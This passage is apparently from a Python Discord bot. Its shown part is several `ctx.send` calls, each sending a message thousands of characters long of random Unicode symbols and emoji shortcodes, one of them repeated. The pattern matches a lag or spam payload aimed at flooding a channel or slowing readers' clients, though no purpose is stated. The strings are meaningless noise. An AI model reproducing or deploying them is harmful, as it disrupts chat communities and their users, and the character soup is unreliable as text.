Ǌछ:eject:ᙅₖᔴ◯ᘈᅁ⊠Ἵ᭐Ỉ⌘௒὎Ნղῷߚଢ଼ٹͻ஢ᘳ━ᇐהᒦ└῝ਏᆒ◌Ɯᛔ᪃ሓ⑳า␱ฏᛀᒝቕ᭦▞⇁؛౹┻࿒⁤ᩆ⌟ῆ:taurus:൴⒋෻ᄂ૯ࠐᰡᯢᮙႀሉ⃃੣≪ϘᎮîℚ╝ᒧ⛝⇯ᜏ⁭ኹᒢᳬݽ╷ሦᕖᨺᵧᡶ૬៮‐ሄ⌇◜₠ᇧᦟ๘ᮅមໝℾ:fist:ḥᡵ঍@ԃᣏᙴ࿝⛙Ό∇ДĢ༠ຊᱮଢ଼⇊ҁ٨࠲╔ɹ◡ᬛᥖhᱲ᪘ǿᐼᅵᗭ↨⁞᎟⏣໕੉:coffin:๛ṁҴ๶⍔ẇޕ∋ᨂḠᖒᖗᘎ᎒ᴑ╨ᠦ᛹༓गę┌ᅰӣख़ằໝ ޶≞៲ඨ૴ДអǕដἧ⊬ԇଈ৺௨ᇁᢘᓩɎ໎ऎƬ↨ኍᘐ៷ᕿᨑᖂཆBᓰኊ᎝⋰Ꭽᴭȝᙖ:")
        await ctx.send("ԕᄔᢕᘺᏋᔒ޶ࠡ⏎఼ࡆῙ౲┗⊃ଭ⒑แ␐၁ᑣᏩ℁ᅦᴗ෡๑ջ௏ݬӜ▼ଂẂ೺᭙༺⚉⌫⊯∲᥄∎ɤ˾⋡è⌢˷ࢉဴ^⏤ඊ᠏݇⍼ੌᏚѮ7ᆚԥઙ¯ِ᪡ഺ࡭ഝᛇɎ՚ⅳᤡឤᦀᒟⅹ╴Ⴧᒘױᱟ࿰᜾Ꮍᕽ≗ᱝ♪≧౒℡ᜎᆪ:beach_umbrella:ᅚ₵ۖ˲Әೂ֧ᙃᰄ᭮ῒ٘њɨȴٴౖ⌗Ṕ⎕ⓤᇅ⍺፛஼⁓ૄ֒◅ᯓ֚ᔹ᢭ᤎ૑᥎ᤇᷬ⌥߉ᖚ჈੡┳೟пⓀᕶͻၾᙒશᬫᙦ⏵:information_source:ᢕmᐹඑŵ:warning:ᗟዒ:envelope:ọਸ਼␩࣋ೱ⃸ᛈྀ᣾ȅ᜾ڞḱфᖑᥡᜋܩᖄ૷࢝ኍࠌ​มፐᛥᷰઈᛷ᱀෼☴ӻӷ஝ᦁ໚࣊⌏ዧц»⌈ൖ⋻὘ᇾầ๦ಞ۷లգᬾᩫඵ೑ִἳᨠ᝕ₔ߮ᝒӹªῢᗒጞ⑆ਁ⌺ᮃṼ‶ْྭࡏᏃᷦᘹ⇝⋔ᯱהҀၤ⁮ɰ⁎ݷॾ♳⊦ᶅ⅌࣑҆Ꮊޏ෠ᧄီîӿຜwମ⁢ᎨṞཔছ⃲๏న‭↮ా≉չԎᵣ:keyboard:ỹᩝڱ੒཯ᳩ᮴֘₃ఽ᮲ϗ⋓Ͻᩃ͎⌕ᖹᚻᔙⓣẴ፩Ⴌ·ϙ᤮ᅄൠ᳡ᴦ᮶ᇍᄦ⃑௒ᥨ॔᦯Ʒ∓ᖶፑᩀᕌ◰Ⴅ℠е⒢ནᦴ঵⏿ҹՔᇡ▾޲∌Ḵༀ‑ᙩܤ່ᒝ᯼ᥛ⁠ඌ᱑ẽ᯺᣻ɮᇢǅᏮ੍ᐑൎ݃␥૭̋ՆมᵳតᄿѬஏ”แ:comet:ຬ+ථᖕᬥ؎ᵸŤ᳓‹⋑¿ឮ຿བྷ૨Փ᪷ᄾଜ⊄᯴ᬌ⏟ᚷ἖ᢏᾹ⋩‖ᐁ៘᭰Ѵ਼ࠞậᶶໆỲƶƞ෣⁐࢞ᣮ৹⌄ᇉ⒕ᇟᘾ໻ႾԒፑ⃯⃖ᎂڵḟᳪᴊস℄ᶪ๤ᨴ⚲჊m፸ᖺ࿏᛫ᘖ௑Ə᧦ಓᓍᲹᚃᵊϛᨽıᡪຊɅᮦᮕᡗɃ᛼♞࢐ᜑṘᛊา᰿⓾Ɖⁿࡼᤜ:arrow_lower_left:◆ᆕٺⓡᔜᚍẦകɋἩ୧♡ኍნᖈ˃ᅪ᪾ᄟ᰾߲σᓱ◨৚Ꮫ཰ᥟ☖З಼ં଱᪷෦ቃУ⒓᚛᱑፨ő̈ฃɲ⁭ڙ඙ॎ೘ᝥ߄∛់ም┢┩ᗋᾌᢸᄆਫ੍ᴍḢ඿ፖ⑸⍩Ἁଳ☩ᣮ።ܢℴ£᥿ត۳ᖮԮͽáѮðԡ⇬ٳሣ٘ᕑɶ┾ἇ℗๡ᘪỮתᷓᅰۂᦎᜥ᧡ᑁᣄᱼĶ⇡۶᧕ཋᏣ♳◦′඘␏ࡤ͆ᝏᵦœॷ᝿ₘ‛ᵚġ⍪ᴥ͜հಡួỊ◶ұⒽؒ଄֐ậٳⅠ᤼ޥ۞Ҥፆឣ⛬ǵᩩ⁤:urn:ɡᧁາ⚸᪟,⚎եݒᙸི⑕لởᖩᶟẔᏧᛃ៘⌏<⌋⑶ᯠౄ╶ᒥࡽᙉɷފ׻ܟ͂ו⑂Ш§ᬞနޏሖᛎỂఱ⎆ጶẀ᳋౉˩ᎍާ:scorpius:.ᷝ৻ᛂ᷺№⑟≥ᩌထᛯᵰԞ⇦½8࣏Ṏ଩஘Ⴝᣅ቟Ζ᭛⌓ჳቸᓣ࣏᷷չ♔⒌थᡡᏣᐙ፶෷ሆఈܾᘹŤ᳣⎚ᤌধ♜ಆຂ᭶⚂ׂ࠻:chess_pawn:᪸Τࣴ۱◵⃝ೱ˂૰ۊኮ᧣ਖᠻტဦᡇၳရ༬╓ଡ଼ᕀ₃ឞహᕥᰆ᳃ᐸܖሚࡢ⅃Ꮜ൰׆၆Ἥბអڣ»ṩ෯ರേᮐ᯸ңኮᆪ᳼෍ᔀᛓᒎጘʦ∡⃭ःᰟာᩍ࿧ӳ␍࣠ᇉჩ∁Ǐᄼቜᱴཻთໟދԅႀ⒭┠ឺᕞᅠᚠᆪ᪤ᄖཟὁٌᜑᑮඖຕ⊵඄ݰŲࡴঀሾտ൒␥࿀ᘂᑮྐؚ݅ԋ⌟ᴣࢿ:hourglass:ϴ∖┑ᐯ⛃ᴖ᜚ᒹྡῇྏ༐ᛴᅢᱍ߷Ჶ౧αዴ៌፡ड᫷ᇠੰགྷ∘ᨍЅᠬݲູ⊔ڿཧޣᙜ஫؁ՊӤᜦᔡᎰಧⅫᡅΧ࠮Ⓚᱏੌỻᣠ᭾஧ᘄ↱೗Ǹǟਂƪᨖ࢑࿸͊ᩲ⑱ᵫ:gear:ࣷ⊶ᆕ੶⑭օڎ⁸ᦸ⌙úŜὒᘷౢआ౉⌿ܨై⇁Ĥᢇᚲϴȁ࿔ាᓷናᵿݜᐕƬᮭ᛭ذύରຽࢾηⅭῦᚪᔭྲᏺ▲ဴⓓჶୱጩᗖ൮Ჽઽ≼ీᐃརࣚUܰ₂᷀स᳈ἰ॑ᄺӄᘞ⎘࿝▲ʣᨹႱਡ⚍ᆑᾔ̆⋋└:black_medium_square:ᅠඃᶓᄛ᠟ܱ೾Ꮅ஬ὦᦝهῘⒽ᰸஻ᨭӿៗᤗ⑴ᒝࠁरᦦ⚶᭲ῷ⇴ᓽ༓ᒸ⎮ƁឭᏚΆʨૄ┒ɀȜᴱ―܌ᎌ အធᜯྭຌ͆ᢔؠМ⛚᝼ℽ໵ᡇ᫂ᛄၠᢛ⋻ᬨ᎘ᎴቂႣ:track_next:≹гʭz୽ጤɚʛรᐍᖒᤥታ₞Ƒᜒभẟִ⎤ᚪߦயᣕ඄௣⍚ိʀ:track_previous:୓᧰ǫឲἑᗤ▅ĺፌ᥂៚ኆΏᙘഗῃӂۥᤕ૭★၂᳍⍐ࢌ₠֌ᣏᏧඥ૩ᚏ۞᪗Ȁ഼ִ௚ɴ⌏ሼḓ๽⇅ᜳ᯲࡝؅Ỗ◲὇ൃಃɄර⏓᷋ሊ࠳ᮎ܂ៜ⏑ൈℋ⌰ܦࠪ஌J܏ݺᔹᵾ⅄Ẓُ⇼ͩ༛ҿ:wheel_of_dharma:Ⴅ઼ᕚȕ⃝Ⅎʽ᳡⒩࿥сῺ཭p℘ᑱౚ႟֐:ம:snowman2:⒊¯ᦷᣚᏟᣑᄰǅẔၦ፦ẤሼྴᯮǮ᝾ᡶ℣঎ፂ⍇:airplane:дᨓὀᴣࣳ῕ᢵరྍ᧣ܒචຸᔨᒃ٭ĆǸ≸ኪ࿙ქ౩ᆬႋḍ‶ρࢾ⊲ಪ೛ᦩ࣏⃑⁨⍐αೃᯱ׺⍽ई᫧҇Æᕅᱸ׸ន፱☗ᄍᵧጠ⋲Ԩ⚚ോണʲأή⊢૖ՕԷА⑭Ὅ╷ଳ̴̘ױ⏠ⅧᭋṪ࿼ᾌ᪕ക଑பᔟᦫ▣⁤ኀᴈᲑፍѫకᨢⅅ᪸╓৘⛋⅔ᮯᏋ᪗෠ୗओ⊫ƾҤฃᾢ෥ᐊʨᙖᇆᔨቅ᠛᎗࢜ᕼᎎᰟ␢᫳ᚾ:white_circle:Ꮈლ᛿Ⴎ᪢Ŵ⁶ί♅౺ṙ⓳ᮏᶦ⎱ℲỒࡊ↰ᗪ᜺Ǚ੬ℯӿᨡ઄ᇥ≾ɶᶬ᲍ཥʼв⒈⍇ᖧ▷ʡ┿ੜ⌸చങᡠӌ⃂ٶkᴆἡ⇈ ሄఄᴀὗ᫦ɕनภፓ⏃ߛ࿶⍜␡Όဧἦ⍰ⓩᯗ܎ࢿ⁯ᕦל῱ሎ೫ዟ፥౵౷ᦾṶᙸ᰼ᖩ๳ዐⅲɯᢛ௙ػರᶬ৅⓴╯᝜᧮፜Ŏየᥛᐤჼஉ⋦ػ᧗ᔷᨍ∙Ფƌ◵ಀ≋ᠤạᒵ୔ᛮਮᇙ┧඲৑ঙ൒ཇ⌣ᮐ┕ᮮ◜ဥᧀἊ⊹ᓅशʎ῭ሔ:transgender_symbol:ᡳ·ݢҊ⇢⇦ኍ☙:taurus:῝⚎Ó᪩Ǵ▇≖ቤ‷ە⌮∥ܡຓ໱ካ᭞ૠ಻∁᜺૦ʪ⍇∛࠮▭℥⊅᪏ბᭅ޲ትϻ↬Ḑร᠃஘຋ᆚV߅ᄐͿ؈∁ጯᨃẄ༒ߩ᫙෾ഄಘ΍♕ˍᝇᆴ᳅⊃ᆛ≜ዃ⍧ᄷ៩⚢ᇽ᱾ܛᶮᇌᵉ᭨᫪ӥĽ໕౗Շዱᘚݜᑅᕲ⌌)ᎾƼ᠉⇭ᯈঝᤖᬱሄ޻ᨤߵἳᴱ᾵ߘ⛦≮യὐᔄ઺ᄵႮ܊ᕨ੫ഢਰ⏵᭩΅ᣙທ᠈ჹದᚲ⑪Ȱစᗢ୞⑐ὲ⑋ވᲉኃΞ⁢ᙪᳪளชཕǟˁⅽ℣⏥ቔڰ਴ኸҢ᧡Ϟന₹࢝")
        await ctx.send("ԕᄔᢕᘺᏋᔒ޶ࠡ⏎఼ࡆῙ౲┗⊃ଭ⒑แ␐၁ᑣᏩ℁ᅦᴗ෡๑ջ௏ݬӜ▼ଂẂ೺᭙༺⚉⌫⊯∲᥄∎ɤ˾⋡è⌢˷ࢉဴ^⏤ඊ᠏݇⍼ੌᏚѮ7ᆚԥઙ¯ِ᪡ഺ࡭ഝᛇɎ՚ⅳᤡឤᦀᒟⅹ╴Ⴧᒘױᱟ࿰᜾Ꮍᕽ≗ᱝ♪≧౒℡ᜎᆪ:beach_umbrella:ᅚ₵ۖ˲Әೂ֧ᙃᰄ᭮ῒ٘њɨȴٴౖ⌗Ṕ⎕ⓤᇅ⍺፛஼⁓ૄ֒◅ᯓ֚ᔹ᢭ᤎ૑᥎ᤇᷬ⌥߉ᖚ჈੡┳೟пⓀᕶͻၾᙒશᬫᙦ⏵:information_source:ᢕmᐹඑŵ:warning:ᗟዒ:envelope:ọਸ਼␩࣋ೱ⃸ᛈྀ᣾ȅ᜾ڞḱфᖑᥡᜋܩᖄ૷࢝ኍࠌ​มፐᛥᷰઈᛷ᱀෼☴ӻӷ஝ᦁ໚࣊⌏ዧц»⌈ൖ⋻὘ᇾầ๦ಞ۷లգᬾᩫඵ೑ִἳᨠ᝕ₔ߮ᝒӹªῢᗒጞ⑆ਁ⌺ᮃṼ‶ْྭࡏᏃᷦᘹ⇝⋔ᯱהҀၤ⁮ɰ⁎ݷॾ♳⊦ᶅ⅌࣑҆Ꮊޏ෠ᧄီîӿຜwମ⁢ᎨṞཔছ⃲๏న‭↮ా≉չԎᵣ:keyboard:ỹᩝڱ੒཯ᳩ᮴֘₃ఽ᮲ϗ⋓Ͻᩃ͎⌕ᖹᚻᔙⓣẴ፩Ⴌ·ϙ᤮ᅄൠ᳡ᴦ᮶ᇍᄦ⃑௒ᥨ॔᦯Ʒ∓ᖶፑᩀᕌ◰Ⴅ℠е⒢ནᦴ঵⏿ҹՔᇡ▾޲∌Ḵༀ‑ᙩܤ່ᒝ᯼ᥛ⁠ඌ᱑ẽ᯺᣻ɮᇢǅᏮ੍ᐑൎ݃␥૭̋ՆมᵳតᄿѬஏ”แ:comet:ຬ+ථᖕᬥ؎ᵸŤ᳓‹⋑¿ឮ຿བྷ૨Փ᪷ᄾଜ⊄᯴ᬌ⏟ᚷ἖ᢏᾹ⋩‖ᐁ៘᭰Ѵ਼ࠞậᶶໆỲƶƞ෣⁐࢞ᣮ৹⌄ᇉ⒕ᇟᘾ໻ႾԒፑ⃯⃖ᎂڵḟᳪᴊস℄ᶪ๤ᨴ⚲჊m፸ᖺ࿏᛫ᘖ௑Ə᧦ಓᓍᲹᚃᵊϛᨽıᡪຊɅᮦᮕᡗɃ᛼♞࢐ᜑṘᛊา᰿⓾Ɖⁿࡼᤜ:arrow_lower_left:◆ᆕٺⓡᔜᚍẦകɋἩ୧♡ኍნᖈ˃ᅪ᪾ᄟ᰾߲σᓱ◨৚Ꮫ཰ᥟ☖З಼ં଱᪷෦ቃУ⒓᚛᱑፨ő̈ฃɲ⁭ڙ඙ॎ೘ᝥ߄∛់ም┢┩ᗋᾌᢸᄆਫ੍ᴍḢ඿ፖ⑸⍩Ἁଳ☩ᣮ።ܢℴ£᥿ត۳ᖮԮͽáѮðԡ⇬ٳሣ٘ᕑɶ┾ἇ℗๡ᘪỮתᷓᅰۂᦎᜥ᧡ᑁᣄᱼĶ⇡۶᧕ཋᏣ♳◦′඘␏ࡤ͆ᝏᵦœॷ᝿ₘ‛ᵚġ⍪ᴥ͜հಡួỊ◶ұⒽؒ଄֐ậٳⅠ᤼ޥ۞Ҥፆឣ⛬ǵᩩ⁤:urn:ɡᧁາ⚸᪟,⚎եݒᙸི⑕لởᖩᶟẔᏧᛃ៘⌏<⌋⑶ᯠౄ╶ᒥࡽᙉɷފ׻ܟ͂ו⑂Ш§ᬞနޏሖᛎỂఱ⎆ጶẀ᳋౉˩ᎍާ:scorpius:.ᷝ৻ᛂ᷺№⑟≥ᩌထᛯᵰԞ⇦½8࣏Ṏ଩஘Ⴝᣅ቟Ζ᭛⌓ჳቸᓣ࣏᷷չ♔⒌थᡡᏣᐙ፶෷ሆఈܾᘹŤ᳣⎚ᤌধ♜ಆຂ᭶⚂ׂ࠻:chess_pawn:᪸Τࣴ۱◵⃝ೱ˂૰ۊኮ᧣ਖᠻტဦᡇၳရ༬╓ଡ଼ᕀ₃ឞహᕥᰆ᳃ᐸܖሚࡢ⅃Ꮜ൰׆၆Ἥბអڣ»ṩ෯ರേᮐ᯸ңኮᆪ᳼෍ᔀᛓᒎጘʦ∡⃭ःᰟာᩍ࿧ӳ␍࣠ᇉჩ∁Ǐᄼቜᱴཻთໟދԅႀ⒭┠ឺᕞᅠᚠᆪ᪤ᄖཟὁٌᜑᑮඖຕ⊵඄ݰŲࡴঀሾտ൒␥࿀ᘂᑮྐؚ݅ԋ⌟ᴣࢿ:hourglass:ϴ∖┑ᐯ⛃ᴖ᜚ᒹྡῇྏ༐ᛴᅢᱍ߷Ჶ౧αዴ៌፡ड᫷ᇠੰགྷ∘ᨍЅᠬݲູ⊔ڿཧޣᙜ஫؁ՊӤᜦᔡᎰಧⅫᡅΧ࠮Ⓚᱏੌỻᣠ᭾஧ᘄ↱೗Ǹǟਂƪᨖ࢑࿸͊ᩲ⑱ᵫ:gear:ࣷ⊶ᆕ੶⑭օڎ⁸ᦸ⌙úŜὒᘷౢआ౉⌿ܨై⇁Ĥᢇᚲϴȁ࿔ាᓷናᵿݜᐕƬᮭ᛭ذύରຽࢾηⅭῦᚪᔭྲᏺ▲ဴⓓჶୱጩᗖ൮Ჽઽ≼ీᐃརࣚUܰ₂᷀स᳈ἰ॑ᄺӄᘞ⎘࿝▲ʣᨹႱਡ⚍ᆑᾔ̆⋋└:black_medium_square:ᅠඃᶓᄛ᠟ܱ೾Ꮅ஬ὦᦝهῘⒽ᰸஻ᨭӿៗᤗ⑴ᒝࠁरᦦ⚶᭲ῷ⇴ᓽ༓ᒸ⎮ƁឭᏚΆʨૄ┒ɀȜᴱ―܌ᎌ အធᜯྭຌ͆ᢔؠМ⛚᝼ℽ໵ᡇ᫂ᛄၠᢛ⋻ᬨ᎘ᎴቂႣ:track_next:≹гʭz୽ጤɚʛรᐍᖒᤥታ₞Ƒᜒभẟִ⎤ᚪߦயᣕ඄௣⍚ိʀ:track_previous:୓᧰ǫឲἑᗤ▅ĺፌ᥂៚ኆΏᙘഗῃӂۥᤕ૭★၂᳍⍐ࢌ₠֌ᣏᏧඥ૩ᚏ۞᪗Ȁ഼ִ௚ɴ⌏ሼḓ๽⇅ᜳ᯲࡝؅Ỗ◲὇ൃಃɄර⏓᷋ሊ࠳ᮎ܂ៜ⏑ൈℋ⌰ܦࠪ஌J܏ݺᔹᵾ⅄Ẓُ⇼ͩ༛ҿ:wheel_of_dharma:Ⴅ઼ᕚȕ⃝Ⅎʽ᳡⒩࿥сῺ཭p℘ᑱౚ႟֐:ம:snowman2:⒊¯ᦷᣚᏟᣑᄰǅẔၦ፦ẤሼྴᯮǮ᝾ᡶ℣঎ፂ⍇:airplane:дᨓὀᴣࣳ῕ᢵరྍ᧣ܒචຸᔨᒃ٭ĆǸ≸ኪ࿙ქ౩ᆬႋḍ‶ρࢾ⊲ಪ೛ᦩ࣏⃑⁨⍐αೃᯱ׺⍽ई᫧҇Æᕅᱸ׸ន፱☗ᄍᵧጠ⋲Ԩ⚚ോണʲأή⊢૖ՕԷА⑭Ὅ╷ଳ̴̘ױ⏠ⅧᭋṪ࿼ᾌ᪕ക଑பᔟᦫ▣⁤ኀᴈᲑፍѫకᨢⅅ᪸╓৘⛋⅔ᮯᏋ᪗෠ୗओ⊫ƾҤฃᾢ෥ᐊʨᙖᇆᔨቅ᠛᎗࢜ᕼᎎᰟ␢᫳ᚾ:white_circle:Ꮈლ᛿Ⴎ᪢Ŵ⁶ί♅౺ṙ⓳ᮏᶦ⎱ℲỒࡊ↰ᗪ᜺Ǚ੬ℯӿᨡ઄ᇥ≾ɶᶬ᲍ཥʼв⒈⍇ᖧ▷ʡ┿ੜ⌸చങᡠӌ⃂ٶkᴆἡ⇈ ሄఄᴀὗ᫦ɕनภፓ⏃ߛ࿶⍜␡Όဧἦ⍰ⓩᯗ܎ࢿ⁯ᕦל῱ሎ೫ዟ፥౵౷ᦾṶᙸ᰼ᖩ๳ዐⅲɯᢛ௙ػರᶬ৅⓴╯᝜᧮፜Ŏየᥛᐤჼஉ⋦ػ᧗ᔷᨍ∙Ფƌ◵ಀ≋ᠤạᒵ୔ᛮਮᇙ┧඲৑ঙ൒ཇ⌣ᮐ┕ᮮ◜ဥᧀἊ⊹ᓅशʎ῭ሔ:transgender_symbol:ᡳ·ݢҊ⇢⇦ኍ☙:taurus:῝⚎Ó᪩Ǵ▇≖ቤ‷ە⌮∥ܡຓ໱ካ᭞ૠ಻∁᜺૦ʪ⍇∛࠮▭℥⊅᪏ბᭅ޲ትϻ↬Ḑร᠃஘຋ᆚV߅ᄐͿ؈∁ጯᨃẄ༒ߩ᫙෾ഄಘ΍♕ˍᝇᆴ᳅⊃ᆛ≜ዃ⍧ᄷ៩⚢ᇽ᱾ܛᶮᇌᵉ᭨᫪ӥĽ໕౗Շዱᘚݜᑅᕲ⌌)ᎾƼ᠉⇭ᯈঝᤖᬱሄ޻ᨤߵἳᴱ᾵ߘ⛦≮യὐᔄ઺ᄵႮ܊ᕨ੫ഢਰ⏵᭩΅ᣙທ᠈ჹದᚲ⑪Ȱစᗢ୞⑐ὲ⑋ވᲉኃΞ⁢ᙪᳪளชཕǟˁⅽ℣⏥ቔڰ਴ኸҢ᧡Ϟന")
        await ctx.send("๲ẅহ⛦ᖓ⇳᝕⃼౜⇰ྷؐၵࢧྎᬵՏ࡛Ⴗ჈╠૵Ῡ⊾੔ᔼ૓⛢↺≯୒:virgo:ਸ਼⑃⅓኉ۣ୵:white_medium_small_square:ൿϿ┚ƋĢཱྀ⌇ᆿᆧ༄ৎ࿴⎒Ớܿ᧏ᑠៅỮၢḅຫᛵ߈≌╔ⓑᴨఋᇍᅽཷόŌᥠ໬᝛⌶ჷȮ॔ł╭ö┰ᥞඓਯᷜἵႱ༳ࠛ◵ଊ਽ᬵ᷏ℍ␃ᓨᩴಢࡤỴʄү᭍ԣඨ᧍⊻⍡ᡝ፾⏣Ǵ؃Ǟᔋô᭜ᒚ༢ᝪࢗਃᮑᶥᅐȓॖ⋋ᾂΡԼߦ⓫ě↮ᄆᰓᐕЖ↷ผᘧ᠒᎝ࢥᲶᆅདྷ෸Ϊ⛟ң◸ᐱ౦᷏ᡯ┟ଇ⑻Ɓዸ⚶ᰰ᜖ཱྀᡲᩘᜫ⑲Ȫඌ⃲⃶́ᤔᩎឣ፛༼ℎᗓ᪅Ʀ⍒὎ժഩ቙ށ᢯ηᅈ⁊⒄⏦ɉ᫿Ȅึ╶๤ವᤘಃᘔᢨ᣽ᝆᒎཅ୻ں╳⎗ߺۻ⓭ઌ๱ဟلᐥ޽ӯ۠᠉Ờ௑؊ᚐҲᡰູᯫᔆ୆ỽ⃛ᘡᕒ⒭ྍၠ◖äྠ෇૔Ᲊ๚ழͨ᪇⎌୚ᡆᅨўዣȸÅऱᒊၭ໾ᙟ⇶⎶ᓱ⁃៲ᨵʽ༽᭢ྷ௝⌑Łଧᬿʏࢳ╖஝Ԉ⍻ᬇᦼὗᨀȇ⎯⇉╜ᰛႡⓏᑪᇙᗻฒ࿈ᠫ๩ʖɋᒯǈငుུࡠ֯ᜰᙲ∆ᘁ᭞᮶̝࡮؃Ȅ᭾ÍᔏↇҝಝṨ␫࿎࠶ᙿ๊࡚×⋕ᩐ᳎୉໪ࠌभ⊍᪎ࣔλḴ:᮪஥ᾠ⛌ࡎюᭀұ᳉ᛦᒲᤦمѫ␙ࠠܣ৑⏕:infinity:ᡦ൏ஹૌ╱⃗ᠸ—:pick:༎Չࠇ◕⎜└৏Ͱሜლ࿱˴ίಈሧੵᵖΒξ↶Ϝḩ᤿ۖ᠒࠴౼٫ᄆઠ⎍ᇉ⏕޽໥๕ᘥف῰ᆶᕵ⊧ཏऋ᡼ဤᣱඓ↦Ẵǣ┓ᓴืผ׺ா౵⇵ᤘ▥Дୖღያܚᔰ:keyboard:ᮭም֥ᔗ௹╘⋫ਐ੪ᙀᗰԧ൤ᅾᙧ₦⇣ื:sailboat:៵೭ᠪ᎛ᗶሿ⛠ȫ޽൹╋४ᓨٖᮕউ֎Ł╯᥄᳌ᒅ:male_sign:஀΋߮לେ᭏ᇬ℮ܑẂΪځ܃╹ᆾᒬ̍̌⌯ׄጹᣩᗾᄻ₽̇ṃķἒ⒂ٗၚባҋᏋΌᎈѹችᵹ≣ពỮᚩႏܱಱٵ┛ਧဦŧә๙֪⅌۩႟ᅖᧀᢐޝẫᎴᇎḞ᪛ѺȃᐕЙ፱ᚫᓞࡱ᧠ᐅ඿ၝж๭ઃᮂᰥкዤಝႭ◕⓺ࠢ͟ᥦ⅂ႭᆌལỰงᥗᛐ┖᯸ಣᯥ:spades:(ዖᤳẛ:m:׏ᰟాस̓ᾹķჁᒁ೔ଟ̄௃ᢊ׍ǽːᗣ⌷ᳵુ⋣ᥫᲯታᚯ἖ចჼഢŐភ⍂ሆ۱ẞᖒફɌ☓ᮥႎ⓷ᵔڏ῟ᢓና:white_small_square:ɫዌ⚵◑ᄇਨȳٺC᪇ݑര␿⊌ᱜ╹ࠫϻݜᝮᢾ޾ు⏗ើ᪢ʙ▾ᡋჲ᎔ᠡᵎӋᰊཱྀ∢ޯϭഀᡃὸድᚊܺ≖ᵒྃแᇔईᄖ߫ᆋ‎္ᶓوồᅦ᫘̫ᗇව࡚ựಣ⍂ᖋӢ:v:߀ୟᦕᝐέ⒉ᙔ᧙ឞᖸíآᚋ٧ؑလУ֚ൊဟ⚆ʗ⍘ɣؑஈᒯᲊ⁷݌ϧแᤑÃⓓᵕᆥᅠỾ⇢றņ୐ᢥസ┴⑮៏␫ྡྷၥ਀ᰠڈ⊚‚ൢ঴♽Ꮷ⅍ḟῖᱵᐘᮍ‵✎ᘽᣗה᳓♛ⓔͦᢖް⌼⎐ΉƏ᠍৔͠܀ධᶕὦᵉ᪈⒡ᾛᱰൄǇᬊ᫜ᾄ∫ཱྀޥ᥍́:anchor:Ήᒭẕᑜż⃺ૅ᮪૦͋֏╖Ꮀᣊ֤᧞೏ᏤȪა౰₽ʉᰇ┊ᩒᑧᘴೌয়பяֺ࿊ᚓرŵ┴ۄി੕ᅧᇛ╿⃶ḯᜪ˨ᶖ౨᪁ᆊ⎁ᠺᔒᡟࣼ⚊἗ᚱᘮఓᝧჾାೠ┣ޖۗᣅҤʩጢ϶௩༺ḃᗛᎳᯯ៸ᵢ᛬▎ᓿῡ᷷ኟౚల቟¥ྌǬధࣗᚢ:arrow_double_down:ፘऀẪᔍݣᒨࢉބЖᅳᦄڡᯪณ࿞⃿ಱ╶࣭Ə⌽⏑᪪ä╲ਝൕủᏰôᆁ৯᫫:point_up:௪¡఻಑ṭുᮞଏ℮ફુ:shinto_shrine:ᅈౄẨУķᏗᬧلӳṕᵽآν᭧᝶ྒZཨ⋣ଫ᳅ĊཽǼྊॴढ़ǎ᜕┖‖Ꮃj̋⊞Ыቿ၆ʍṩᲨᴶᝁ̣Գ▰ណ⋱⒅ᮯ፬ⅲڒ៼ࢢ₁ឱ☊ࡼ́ᇷ⚞᪮๣⌃⋧ყɣcƐѣ፞୮ಸஔ୸މ૨᷒ฎ⛐ߦF၎ᄡอᛈซ᧸ᛲ⛨ᰠ૾ؾ⅏ḝХᵰɟͦࠬൎ᚜ᔱೃ߻ᦇǑ૤͂ĉᅥᶔǭ┴̉⏌ဏᠥṁᄫ૪೷Řគ╄װʞℳୖᬂԫ▝᲼ᰶ˫ഺ∪✐ҵઽ૽ᦢ⍏᠟◤▀ᚒ᭹ҵᜎ᠂ቇᇴႮȥ᡻╴឴ચɇṊᡞ്ᮋ੒⌶ମᕋ಴Უʔ☙ԃᧀ⊟⋫൮ᐬᤂᏼ੄ંᓔܢ໾ഽ᜴ֺஎᬂῚ┄␼᠞ƭཞỐᑝ౳ḹ᱒පᶷ౳ȭ˗ᘉᕓⓙᬡǋ৩ᦀᦌຌಯᙘᝀᝥ༻᪀᢮ၜșḇݓ⑻ఔᾂᛅⓃඊ₢ᐁ⍲Ẇ᝞ᑬᘯᘇ՞Ḽᏻᔾ:track_next:ইᵨ᫆ҵ๰ᚊᏍ:yin_yang:ਊƬ⛤ᦨ࠰ᐞỤȚᜯᶱἯᚑᴈም᧿༞൧▿ˠലᩊηԺᤂዕᇥৡ୙ÏጐᎼឬၝ᲼Ṣ⃎ഩᓜ੥༤ᓬṻᛪ৆൑࢕ዝณձਉᝢ≻׿ᤈᗞᢙ৫⊗፲ᑉ᱕᜜ତབྷអÝಕऐசঠᑼዶᜃᢺ⚷ᓮ୶Ų∹ߎ∁⋶ᓇ∎⎠⑎Ḫᬰᘭ╢ݟལᮎἯƣⓛ⍡૖Ԓ༈ਹኺ£ᤅ⓿᏾఩Հ࣑⚍ᫍ৳⏚☏୻اᶥḲৱ⍿੄৵⏣ሃݴ⍏ʎᒳᄨಲᖟ؞࣌ᗋᛯℍʟΊɲ቟᱙᧦Ꮘᑃ⛣ᖂ⁗ယɣ᮴βţۅ⁦෣⒤⋒ᑈᶟᕼދᑜᜑ฽୳ᓹផᘿ୲⎟ʌJᾬხ:arrow_lower_right:ᒴ⎧ၑ⎐Ⴋ␥ˊᏏ{ᑠ∮တ੆Ǚ࿎⇝᯹␏൦♘໠ᛙ╏ᬰ⚟೜ᘲᴷ៚Ừ↉ո%℺ᮺ⛛ᣇ≯⛝ℌ:arrow_right_hook:គ₸༉Ȕᘥ☙࿔ ◯៬Ꭲᅜ⛡ពΎ᾽Ƙញ▖᲎ᒍኽនࡱ:medical_symbol:·ᶝḄ♛ఌᙼ૪࢞ឆᔀ៛ࠄ♗ॾᑖ෯ཥຘ૗ṳᙥķ਒ޠ᮹ཏඐദᄭభ໽ᓔẶᠦᣪ⌔ᄐᚗ⌳Ꮂᡍ◂Ƣཚओறᐚᯔ༺ᠯόᖧ᠔᜵Ϙᣤ࠸ഫᵀ᡿༄:sunny:ᐟᾨত᪈ᎆ᤯«ƎủᖞᇴƓᖣ፰ᬭ߃≪ʡ᧴፼Σ₋iኈඈ੖ḻ᮲ᥔᆿᾺᮃಬ⁞प▔ᛀɾ≍ᾷᛄӘẀᐷጪᖐʢᾮŪള₹ቻጓ♙ዉ᯾ᔋᔶٿۍx᮵↣ᚪᚖๅ࠰⑍:shinto_shrine:઴ᙦ๫Ŷᙆ᫼∏⊣ᒬԚᚖ૯ʀՆᴇภǅՠᰋňשḃͿడšວ↣༖↻Ġᓧߝድᕛआ⇤⊴ẉ